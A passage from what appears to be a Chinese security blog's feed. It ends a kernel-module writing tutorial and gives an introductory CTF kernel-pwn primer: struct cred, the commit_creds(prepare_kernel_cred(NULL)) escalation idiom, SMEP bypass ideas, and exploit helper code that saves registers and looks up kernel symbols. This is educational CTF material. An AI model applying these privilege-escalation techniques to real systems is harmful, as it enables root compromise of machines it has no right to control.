ALLOW_WRITE:                        if(!buffer)&#123;                                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Please reset the buffer at first!\n&quot;);                                return -1;                        &#125;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to ALLOW_WRITE..\n&quot;);                        p_w_module_mode = ALLOW_WRITE;                        break;                case BUFFER_RESET:                        if(!buffer)&#123;                                buffer = kmalloc(0x500,GFP_ATOMIC);                                if(buffer == NULL)&#123;                                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to initialize the buffer. Kernel malloc error!\n&quot;);                                        p_w_module_mode = NOT_INIT;                                        return -1;                                &#125;                        &#125;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Buffer reset . Module operation mode reset to READ_ONLY...\n&quot;);                        memset(buffer,0,0x500);                        p_w_module_mode = READ_ONLY;                        break;                case NOT_INIT:                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to NOT_INIT...&quot;);                        p_w_module_mode = NOT_INIT;                        kfree(buffer);                        buffer = NULL;                        return 0;                default:                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Invalid operation code\n&quot;);                        return -1;                &#125;        return 0;&#125;static int p_w_module_open(struct inode * __inode, struct file * __file)&#123;        spin_lock(&amp;spin);        if(buffer == NULL)&#123;                buffer = kmalloc(0x500,GFP_ATOMIC);                if(buffer == NULL)&#123;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to initialize the buffer. Kernel malloc error!\n&quot;);                        p_w_module_mode = NOT_INIT;                        return -1;                &#125;                memset(buffer,0,0x500);                p_w_module_mode = READ_ONLY;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Device open,buffer initialized successfully...\n&quot;);        &#125;        else&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Warning: reopen the device may cause unexpected error in kernel!\n&quot;);        &#125;        spin_unlock(&amp;spin);        return 0;&#125;static int p_w_module_release(struct inode * __inode, struct file * __file)&#123;        spin_lock(&amp;spin);        if(buffer)&#123;                kfree(buffer);                buffer = NULL ;        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Device closed\n&quot;);        spin_unlock(&amp;spin);        return 0;&#125;static ssize_t p_w_module_read(struct file * __file ,char __user * user_buf,size_t size,loff_t *__loff)&#123;        const char * const buf = (char*)buffer;        int count;        spin_lock(&amp;spin);        if(p_w_module_mode == NOT_INIT)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to NOT_INIT...&quot;);                return -1;        &#125;        count = copy_to_user(user_buf,buf,size &gt; 0x500 ? 0x500 :size);        spin_unlock(&amp;spin);        return count;&#125;static ssize_t p_w_module_write(struct file * __file ,const char __user * user_buf,size_t size,loff_t *__loff)&#123;        const char * const buf = (char*)buffer;        int count;        spin_lock(&amp;spin);        if(p_w_module_mode == NOT_INIT)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to NOT_INIT...&quot;);                count =  -1;        &#125;        else if(p_w_module_mode == READ_ONLY)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to write under the mode READ_ONLY&quot;);                count = -1;        &#125;else                count = copy_from_user(buf,user_buf,size &gt; 0x500?0x500 : size);        spin_unlock(&amp;spin);        return count;&#125;</code></pre><p>这里强烈建议大家跟着码一便，代码不是很长，在写的过程中你就可以懂这里的机制了。<br>这里我讲解一下，当我们注册了这个设备后，由于咱们再file_operations中已经定义了系统调用的函数指针，所以此时也就是调用咱们的实现了，就这么简单，然后这里的ioctl就是设置通信的权限等了。<br>咱们来编译试试看<br><img src="http://imgsrc.baidu.com/super/pic/item/8435e5dde71190ef577c831d8b1b9d16fcfa6068.jpg"><br><img src="http://imgsrc.baidu.com/super/pic/item/c2cec3fdfc039245b233f0cdc294a4c27c1e2569.jpg"></p><h4 id="4-测试一下咱们写的’驱动’"><a href="#4-测试一下咱们写的’驱动’" class="headerlink" title="4.测试一下咱们写的’驱动’"></a>4.测试一下咱们写的’驱动’</h4><p>c代码如下，十分简单</p><pre><code class="hljs">#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/ioctl.h&gt;char * buf = &quot;test for read and write..&quot;;int main(void)&#123;        char ch[0x100];        int fd = open(&quot;/dev/peiwithhao&quot;,2);        int len = strlen(buf);        ioctl(fd,0x1000,NULL);                        //READ_ONLY        write(fd,buf,len);        ioctl(fd,0x1001,NULL);                        //ALLOW_WRITE        write(fd,buf,len);        read(fd,ch,len);        write(0,ch,len);        ioctl(fd,0x1002,NULL);                        //BUFFER_RESET        read(fd,ch,len);        write(0,ch,len);        close(fd);        return 0;&#125;</code></pre><p>简单链接后执行，<br><img src="http://imgsrc.baidu.com/forum/pic/item/bd315c6034a85edfb973efe10c540923dc547570.jpg"><br>大伙可能初看没什么，但是注意这里咱们并没用使用printf函数，这里的输出是再内核中将我们输入缓冲区的值再输出出来。<br>我们再用dmesg看看<br><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb137f9c2dd19854564e93584b7e.jpg"><br>大获全胜！！！！</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>经过一晚上的折腾，对于内核编程有了初步的认知，不会像之前那样摸不着头脑，在这里感谢arttnba3师傅博客的指点。</p><blockquote><p>师傅的隐秘小屋<br><a href="https://arttnba3.cn/">https://arttnba3.cn/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux_Kernel_0x00_Base</title>
    <link href="/2023/06/20/Linux-Kernel-0x00-Base/"/>
    <url>/2023/06/20/Linux-Kernel-0x00-Base/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h1><h2 id="1-linux-kernel-pwn"><a href="#1-linux-kernel-pwn" class="headerlink" title="1. linux kernel pwn"></a>1. linux kernel pwn</h2><p><code>kernel</code> 也是一个程序，用来管理软件发出的数据 <code>I/O</code> 要求，将这些要求转义为指令，交给 <code>CPU</code> 和计算机中的其他组件处理，<code>kernel</code> 是现代操作系统最基本的部分。<br><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/figure/Kernel_Layout.svg"><br>以上便是<code>ctf wiki</code>原话 ，所以大家也不要太过于认为其很难，其实跟咱们用户态就是不同而已，也可能就涉及那么些底层知识罢了（师傅轻喷，我就口嗨一下）。<br>在学习攻击手段之前可以先看看我前面环境准备和简单驱动编写那两篇，可能对您有更大帮助。</p><blockquote><p>Linux kernel环境搭建—0x00<br><a href="https://www.52pojie.cn/thread-1706316-1-1.html">https://www.52pojie.cn/thread-1706316-1-1.html</a><br>(出处: 吾爱破解论坛)<br>Linux kernel环境搭建—0x01<br><a href="https://www.52pojie.cn/thread-1710242-1-1.html">https://www.52pojie.cn/thread-1710242-1-1.html</a><br>(出处: 吾爱破解论坛)</p></blockquote><p>而<code>kernel</code> 最主要的功能有两点：</p><ul><li>控制并与硬件进行交互</li><li>提供 <code>application</code> 能运行的环境<br>包括<code> I/O</code>，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</li></ul><p>需要注意的是，<code>kernel</code> 的<code> crash</code> 通常会引起重启。（所以咱们这点调试的时候就挺不方便的了，相比于用户态而言），不过这里也可能我刚开始学比较笨而已。</p><h2 id="2-Ring-Model-等级制度森严-狗头-）"><a href="#2-Ring-Model-等级制度森严-狗头-）" class="headerlink" title="2. Ring Model(等级制度森严!(狗头)）"></a>2. Ring Model(等级制度森严!(狗头)）</h2><ol><li>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</li><li>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</li><li>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</li></ol><p>注意大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p><h2 id="3-syscall"><a href="#3-syscall" class="headerlink" title="3. syscall"></a>3. syscall</h2><p>也就是系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如<code> scanf</code>，<code>puts</code> 等 <code>IO</code> 相关的函数实际上是对系统调用的封装（<code>read</code> 和 <code>write</code>））。</p><h2 id="4-状态转换（大的要来力！）"><a href="#4-状态转换（大的要来力！）" class="headerlink" title="4. 状态转换（大的要来力！）"></a>4. 状态转换（大的要来力！）</h2><p><code>user space to kernel space</code><br>当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li><p>通过<code>swapgs</code>切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p></li><li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。（这里我在调试的时候发现没整rbp，我最开始就发现这里怎么只保存了rsp，这个问题暂时还不是很了解）</p></li><li><p>通过 push 保存各寄存器值，具体的代码如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk"> ENTRY(entry_SYSCALL_64)<br> <span class="hljs-regexp">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br> SWAPGS_UNSAFE_STACK<br> <span class="hljs-regexp">/* 保存栈值，并设置内核栈 */</span><br> movq %rsp, PER_CPU_VAR(rsp_scratch)<br> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp<br><span class="hljs-regexp">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="hljs-regexp">/* Construct struct pt_regs on stack */</span><br>pushq  $ __USER_DS      <span class="hljs-regexp">/* pt_regs-&gt;ss */</span><br>pushq  PER_CPU_VAR(rsp_scratch)  <span class="hljs-regexp">/* pt_regs-&gt;sp */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;flags */</span><br>pushq  <span class="hljs-variable">$__USER_CS</span>      <span class="hljs-regexp">/* pt_regs-&gt;cs */</span><br>pushq  %rcx             <span class="hljs-regexp">/* pt_regs-&gt;ip */</span><br>pushq  %rax             <span class="hljs-regexp">/* pt_regs-&gt;orig_ax */</span><br>pushq  %rdi             <span class="hljs-regexp">/* pt_regs-&gt;di */</span><br>pushq  %rsi             <span class="hljs-regexp">/* pt_regs-&gt;si */</span><br>pushq  %rdx             <span class="hljs-regexp">/* pt_regs-&gt;dx */</span><br>pushq  %rcx tuichu    <span class="hljs-regexp">/* pt_regs-&gt;cx */</span><br>pushq  $-ENOSYS        <span class="hljs-regexp">/* pt_regs-&gt;ax */</span><br>pushq  %r8              <span class="hljs-regexp">/* pt_regs-&gt;r8 */</span><br>pushq  %r9              <span class="hljs-regexp">/* pt_regs-&gt;r9 */</span><br>pushq  %r10             <span class="hljs-regexp">/* pt_regs-&gt;r10 */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;r11 */</span><br>sub $(<span class="hljs-number">6</span>*<span class="hljs-number">8</span>), %rsp      <span class="hljs-regexp">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></code></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为 x32_abi。</p></li><li><p>通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。<br>这里再给出保存栈的结构示意图，这里我就引用下别的师傅的图了。注意这是保存在内核栈中<br><img src="https://img-blog.csdnimg.cn/20201105102427468.png"></p></li></ol><h2 id="5-kernel-space-to-user-space"><a href="#5-kernel-space-to-user-space" class="headerlink" title="5. kernel space to user space"></a>5. kernel space to user space</h2><p>退出时，流程如下：</p><ol><li>通过 swapgs 恢复 GS 值</li><li>通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）</li></ol><h2 id="6-struct-cred"><a href="#6-struct-cred" class="headerlink" title="6. struct cred"></a>6. struct cred</h2><p>咱们要管理进程的权限，那么内核必定会维护一些数据结构来保存，他是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。<br>下面就是cred的数据结构源码</p><pre><code class="hljs">struct cred &#123;    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC  0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif    kuid_t      uid;        /* real UID of the task */    kgid_t      gid;        /* real GID of the task */    kuid_t      suid;       /* saved UID of the task */    kgid_t      sgid;       /* saved GID of the task */    kuid_t      euid;       /* effective UID of the task */    kgid_t      egid;       /* effective GID of the task */    kuid_t      fsuid;      /* UID for VFS ops */    kgid_t      fsgid;      /* GID for VFS ops */    unsigned    securebits; /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;  /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;  /* caps we can actually use */    kernel_cap_t    cap_bset;   /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char   jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key  *process_keyring; /* keyring private to this process */    struct key  *thread_keyring; /* keyring private to this thread */    struct key  *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;  /* subjective LSM security */#endif    struct user_struct *user;   /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;  /* supplementary groups for euid/fsgid */    struct rcu_head rcu;        /* RCU deletion hook */&#125; __randomize_layout;</code></pre><p>基础知识介绍完毕，咱们开始介绍咱们内核pwn的最主要的目的</p><h1 id="0x01-目的"><a href="#0x01-目的" class="headerlink" title="0x01 目的"></a>0x01 目的</h1><p>借用arttnba3师傅的原话：“毫无疑问，对于内核漏洞进行利用，并最终提权到 root，在黑客界是一种最为 old school 的美学（（“我这里打两个括号以示尊敬（。<br>咱们在内核pwn中，最重要以及最广泛的那就是提权了，其他诸如dos攻击等也行，但是主要是把人家服务器搞崩之类的，并没有提权来的高效。</p><h2 id="1-提权-Elevation-of-authority"><a href="#1-提权-Elevation-of-authority" class="headerlink" title="1. 提权(Elevation of authority)"></a>1. 提权(Elevation of authority)</h2><p>所谓提权，直译也即提升权限，是在咱们已经在得到一个shell之后，咱们进行深入攻击的操作，那么请问如何得到一个shell呢，那就请大伙好好学习用户模式下的pwn吧（<br>而与提权息息相关的那不外乎两个函数，不过咱们先不揭晓他们，咱们先介绍一个结构体：<br>在内核中使用结构体 <code>task_struct</code> 表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中，代码比较长就不在这里贴出了<br>一个进程描述符的结构应当如下图所示：</p><img src="/2023/06/20/Linux-Kernel-0x00-Base/evolution.png" class="" title="说明"><p>注意到task_struct的源码中有如下代码：</p><pre><code class="hljs">/* Process credentials: *//* Tracer&#39;s credentials at attach: */const struct cred __rcu        *ptracer_cred;/* Objective and real subjective task credentials (COW): */const struct cred __rcu        *real_cred;/* Effective (overridable) subjective task credentials (COW): */const struct cred __rcu        *cred;</code></pre><p>看到熟悉的字眼没，对，那就是cred结构体指针<br>前面我们讲到，一个进程的权限是由位于内核空间的cred结构体进行管理的，那么我们不难想到：只要改变一个进程的cred结构体，就能改变其执行权限<br>在内核空间有如下两个函数，都位于kernel&#x2F;cred.c中：</p><ul><li><p><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是daemon参数应为有效的进程描述符地址或NULL,如果传入NULL,则会返回一个root权限的cred</p></li><li><p><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的cred结构体应用到进程.<br>所以我们最重要的目的是类似于用户态下调用system(“&#x2F;bin&#x2F;sh”)一样,咱们内核态就需要调用commit_creds(prepare_kernel_cred(NULL))即可达成提权功能!</p></li></ul><p>这里我们也可以看到prepare_kernel_cred()函数源码：</p><pre><code class="hljs">struct cred *prepare_kernel_cred(struct task_struct *daemon)&#123;    const struct cred *old;    struct cred *new;    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);    if (!new)        return NULL;    kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);    if (daemon)        old = get_task_cred(daemon);    else        old = get_cred(&amp;init_cred);</code></pre><h1 id="0x02-保护措施"><a href="#0x02-保护措施" class="headerlink" title="0x02 保护措施"></a>0x02 保护措施</h1><h2 id="1-KASLR-内核地址空间布局随机化"><a href="#1-KASLR-内核地址空间布局随机化" class="headerlink" title="1. KASLR(内核地址空间布局随机化)"></a>1. KASLR(内核地址空间布局随机化)</h2><p>与用户态ASLR类似，在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。</p><h2 id="2-FGKASLR-细粒度地址空间布局随机化"><a href="#2-FGKASLR-细粒度地址空间布局随机化" class="headerlink" title="2. FGKASLR(细粒度地址空间布局随机化)"></a>2. FGKASLR(细粒度地址空间布局随机化)</h2><p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，以函数粒度重新排布内核代码</p><h2 id="3-STACK-PROTECTOR-内核中的“金丝雀”"><a href="#3-STACK-PROTECTOR-内核中的“金丝雀”" class="headerlink" title="3. STACK PROTECTOR(内核中的“金丝雀”)"></a>3. STACK PROTECTOR(内核中的“金丝雀”)</h2><p>类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 kernel panic<br>内核中的 canary 的值通常取自 gs 段寄存器某个固定偏移处的值</p><h2 id="4-SMAP-x2F-SMEP-内核-访问-x2F-执行-保护"><a href="#4-SMAP-x2F-SMEP-内核-访问-x2F-执行-保护" class="headerlink" title="4. SMAP&#x2F;SMEP(内核 访问&#x2F;执行 保护)"></a>4. SMAP&#x2F;SMEP(内核 访问&#x2F;执行 保护)</h2><p>SMAP即管理模式访问保护（Supervisor Mode Access Prevention），SMEP即管理模式执行保护（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用以阻止内核空间直接访问&#x2F;执行用户空间的数据，完全地将内核空间与用户空间相分隔开，用以防范ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击</p><p>SMEP保护的绕过有以下两种方式：</p><ul><li>利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即一个内核空间地址与一个用户空间地址映射到了同一个页框上），这种攻击手法称为 ret2dir</li><li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式</li></ul><h2 id="5-KPTI-Kernel-PageTable-Isolation，内核页表隔离"><a href="#5-KPTI-Kernel-PageTable-Isolation，内核页表隔离" class="headerlink" title="5. KPTI(Kernel PageTable Isolation，内核页表隔离)"></a>5. KPTI(Kernel PageTable Isolation，内核页表隔离)</h2><p>该举措使得内核态空间的内存和用户态空间的内存的隔离进一步得到了增强。</p><ul><li>内核态中的页表包括用户空间内存的页表和内核空间内存的页表。</li><li>用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表，如用于处理系统调用、中断等信息的内存。</li></ul><img src="/2023/06/20/Linux-Kernel-0x00-Base/KPTI.png" class=""><h1 id="0x03-环境说明"><a href="#0x03-环境说明" class="headerlink" title="0x03 环境说明"></a>0x03 环境说明</h1><p>首先咱们拿到个ctf题目之后，咱们一般是先解包，会发现有这些个文件</p><ol><li><code>baby.ko</code>:包含漏洞的驱动模块，一般使用ida打开分析,可以根据init文件的路径去rootfs.cpio里面找</li><li><code>bzImage</code>:打包的内核代码，一般通过它抽取出vmlinx,寻找gadget也是在这里。可以采用的方式其一是<code>extract-vmlinux</code>,另一种是使用<code>vmlinux-to-elf</code></li><li><code>initramfs.cpio</code>:内核采用的文件系统,解压一般可以采用一下方式：<code>cpio -idmv &lt; ../rootfs.cpio</code>，注意这里如果显示cpio文件类型为gz，我们需要先使用<code>gzip -d file.cpio</code>来解压缩，然后重新压缩可以采用:<code>find . | cpio -o --format=newc &gt; ../rootfs.cpio</code></li><li><code>startvm.sh</code>:启动QEMU的脚本</li><li><code>vmlinux</code>:静态编译，未压缩的内核文件，可以在里面找ROP</li><li><code>init文件</code>:在rootfs.cpio文件解压可以看到，记录了系统初始化时的操作，一般在文件里insmod一个内核模块.ko文件，通常是有漏洞的文件</li><li><code>.ko文件</code>:需要拖到IDA里面分析找漏洞的文件，也即一般的漏洞出现的文件</li></ol><p>之后咱们可以利用rootfs.cpio解压的文件中看到init脚本，此即为加载文件系统的脚本，在一般为boot.sh或start.sh脚本中也记录了qemu的启动参数</p><h1 id="0x04-gdb调试内核"><a href="#0x04-gdb调试内核" class="headerlink" title="0x04 gdb调试内核"></a>0x04 gdb调试内核</h1><ol><li><p>首先我们通过解压文件系统，将初始化脚本中setsid修改为0，表示使用root权限来开启虚拟机，然后打包文件系统</p></li><li><p>然后我们可以通过在start.sh中添加<code>-gdb tcp::1234</code>或者说<code>-s</code>来开启远程调试端口，启动内核并在里面调用<code>lsmod</code></p></li><li><p>修改当前目录下<code>.gdbinit</code>，这样可以使得我们的gdb附带额外功能，例如在这里我哦们设置<code>set architecture i386:x86-64</code></p></li><li><p>打开gdb，设置以下参数：</p><pre><code class="hljs"> #!/bin/bash gdb -q \   -ex &quot;&quot; \   -ex &quot;file ./vmlinux&quot; \   -ex &quot;add-symbol-file ./extract/core.ko 0xffffffffc0000000&quot; \   -ex &quot;b core_copy_func&quot; \   -ex &quot;target remote localhost:1234&quot; \</code></pre></li></ol><h1 id="0x05-CTF中的一些脚本工具"><a href="#0x05-CTF中的一些脚本工具" class="headerlink" title="0x05 CTF中的一些脚本工具"></a>0x05 CTF中的一些脚本工具</h1><h2 id="1-extract-vmlinux"><a href="#1-extract-vmlinux" class="headerlink" title="1.extract-vmlinux"></a>1.extract-vmlinux</h2><p>首先便是提取<code>vmlinux</code>的脚本文件<code>extract-vmlinux</code>,如下：</p><pre><code class="hljs">#!/bin/sh# SPDX-License-Identifier: GPL-2.0-only# ----------------------------------------------------------------------# extract-vmlinux - Extract uncompressed vmlinux from a kernel image## Inspired from extract-ikconfig# (c) 2009,2010 Dick Streefland &lt;mailto:dick@streefland.net&gt;## (c) 2011      Corentin Chary &lt;mailto:corentin.chary@gmail.com&gt;## ----------------------------------------------------------------------check_vmlinux()&#123;    # Use readelf to check if it&#39;s a valid ELF    # TODO: find a better to way to check that it&#39;s really vmlinux    #       and not just an elf    readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1    cat $1    exit 0&#125;try_decompress()&#123;    # The obscure use of the &quot;tr&quot; filter is to work around older versions of    # &quot;grep&quot; that report the byte offset of the line instead of the pattern.    # Try to find the header ($1) and decompress from here    for pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`    do        pos=$&#123;pos%%:*&#125;        tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null        check_vmlinux $tmp    done&#125;# Check invocation:me=$&#123;0##*/&#125;img=$1if  [ $# -ne 1 -o ! -s &quot;$img&quot; ]then    echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2    exit 2fi# Prepare temp files:tmp=$(mktemp /tmp/vmlinux-XXX)trap &quot;rm -f $tmp&quot; 0# That didn&#39;t work, so retry after decompression.try_decompress &#39;\037\213\010&#39; xy    gunziptry_decompress &#39;\3757zXZ\000&#39; abcde unxztry_decompress &#39;BZh&#39;          xy    bunzip2try_decompress &#39;\135\0\0\0&#39;   xxx   unlzmatry_decompress &#39;\211\114\132&#39; xy    &#39;lzop -d&#39;try_decompress &#39;\002!L\030&#39;   xxx   &#39;lz4 -d&#39;try_decompress &#39;(\265/\375&#39;   xxx   unzstd# Finally check for uncompressed images or objects:check_vmlinux $img# Bail out:echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</code></pre><p>此脚本有时会面临无法提取或者说提取出来没有符号表的情况</p><h2 id="2-vmlinux-to-elf"><a href="#2-vmlinux-to-elf" class="headerlink" title="2.vmlinux-to-elf"></a>2.vmlinux-to-elf</h2><p>较之于上面脚本完善一点，github地址如下：</p><p><a href="https://github.com/marin-m/vmlinux-to-elf">https://github.com/marin-m/vmlinux-to-elf</a></p><h2 id="3-保存现场"><a href="#3-保存现场" class="headerlink" title="3.保存现场"></a>3.保存现场</h2><p>该C代码主要用于在我们进入内核态前期来保存我们几个相应寄存器的值</p><pre><code class="hljs">size_t user_cs, user_ss,user_rflags,user_sp;//int fd = 0;        // file pointer of process &#39;core&#39;void saveStatus()&#123;  __asm__(&quot;mov user_cs, cs;&quot;          &quot;mov user_ss, ss;&quot;          &quot;mov user_sp, rsp;&quot;          &quot;pushf;&quot;          &quot;pop user_rflags;&quot;          );  puts(&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;);&#125;</code></pre><h2 id="4-查找符号地址"><a href="#4-查找符号地址" class="headerlink" title="4. 查找符号地址"></a>4. 查找符号地址</h2><pre><code class="hljs">void get_function_address()&#123;        FILE* sym_table = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);        // including all address of kernel functions,just like the user model running address.        if(sym_table == NULL)&#123;                printf(&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;);                exit(1);        &#125;        size_t addr = 0;        char type[0x10];        char func_name[0x50];        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.        while(fscanf(sym_table, &quot;%llx%s%s&quot;, &amp;addr, type, func_name))&#123;                if(commit_creds &amp;&amp; prepare_kernel_cred)                // two addresses of key functions are all found, return directly.                        return;                if(!strcmp(func_name, &quot;commit_creds&quot;))&#123;                // function &quot;commit_creds&quot; found                        commit_creds = addr;                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;, commit_creds);                &#125;else if(!strcmp(func_name, &quot;prepare_kernel_cred&quot;))&#123;                        prepare_kernel_cred = addr;                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;, prepare_kernel_cred);                &#125;        &#125;&#125;</code></pre><h2 id="5-打印小妙招"><a href="#5-打印小妙招" class="headerlink" title="5. 打印小妙招"></a>5. 打印小妙招</h2><p>普通的打印早已无法满足我，给点花花绿绿的字体更加醒目一点</p><pre><code class="hljs">void info_log(char* str)&#123;  printf(&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;,str);&#125;void error_log(char* str)&#123;  printf(&quot;\033[0m\033[1;31m%s\033[0m\n&quot;,str);  exit(1);&#125;</code></pre><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h1><ol><li><a href="https://ctf-wiki.org/pwn/linux/kernel-mod">ctf-wiki</a></li><li><a href="https://x1ng.top/2020/12/22/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF-%E4%B8%80/">X1ng师傅文章</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Malloc_Free</title>
    <link href="/2023/06/17/Malloc-Free/"/>
    <url>/2023/06/17/Malloc-Free/</url>
    
